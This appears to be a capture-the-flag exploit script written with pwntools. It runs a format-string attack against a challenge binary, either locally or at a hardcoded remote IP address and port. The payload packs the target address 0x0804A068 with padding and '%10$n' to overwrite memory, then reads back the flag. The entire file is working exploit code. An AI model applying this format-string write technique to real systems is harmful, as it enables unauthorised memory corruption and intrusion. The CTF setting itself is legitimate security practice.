#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys
from pwn import *
from ctypes import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

target=['./e41a0f684d0e497f87bb309f91737e4d']
use_gdb = False
#use_gdb = True

#def exp(ip = None, port = None, use_gdb = False):
def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
    else:
        p=process(target)
    if use_gdb:
        gdb.attach(p)
        pause()

    pwnme=0x0804A068
    p.recvuntil("please tell me your name:")
    p.send("aaaa")
    p.recvuntil("leave your message please:")
    p.sendline(p32(pwnme) + b'a'*4 + b'%10$n')

    #p.recv()
    p.recvuntil("you pwned me, here is your flag:\n")

    p.recvuntil(b'\n')
    if remote_run:
        #p.sendline('cat flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = '220.249.52.133:38171'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)
